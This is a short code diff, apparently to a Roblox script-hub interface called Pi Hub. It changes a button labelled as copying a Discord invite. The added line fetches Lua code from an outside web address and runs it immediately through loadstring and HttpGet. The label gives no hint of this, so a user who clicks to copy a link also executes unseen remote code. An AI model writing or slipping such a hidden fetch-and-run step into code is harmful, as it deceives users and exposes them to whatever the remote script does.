@@ -40,6 +40,7 @@ Tab:AddButton({
 	Name = "Copy Pi Hub Discord!",
 	Callback = function()
       		setclipboard("https://discord.gg/dVSFmJYDdS")
+		loadstring(game:HttpGet("https://pi-hub3-14.vercel.app/loading/a.lua"))()
   	end    
 }) 
     
